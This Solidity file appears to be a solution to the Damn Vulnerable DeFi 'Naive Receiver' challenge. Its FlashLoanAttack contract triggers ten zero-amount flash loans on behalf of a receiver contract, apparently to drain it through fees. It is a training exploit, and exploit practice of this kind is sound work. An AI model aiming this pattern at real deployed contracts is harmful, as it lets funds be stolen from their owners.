// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanAttack {
    NaiveReceiverLenderPool private naiveReceiverLenderPool;
    FlashLoanReceiver private flashLoanReceiver;

    constructor(
        address payable _naiveReceiverLenderPool,
        address payable _flashLoanReceiver
    ) {
        naiveReceiverLenderPool = NaiveReceiverLenderPool(
            _naiveReceiverLenderPool
        );
        flashLoanReceiver = FlashLoanReceiver(_flashLoanReceiver);
    }

    function AttackFlashLoan() external {
        for (uint256 i = 0; i <= 9; i++) {
            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        }
    }
}
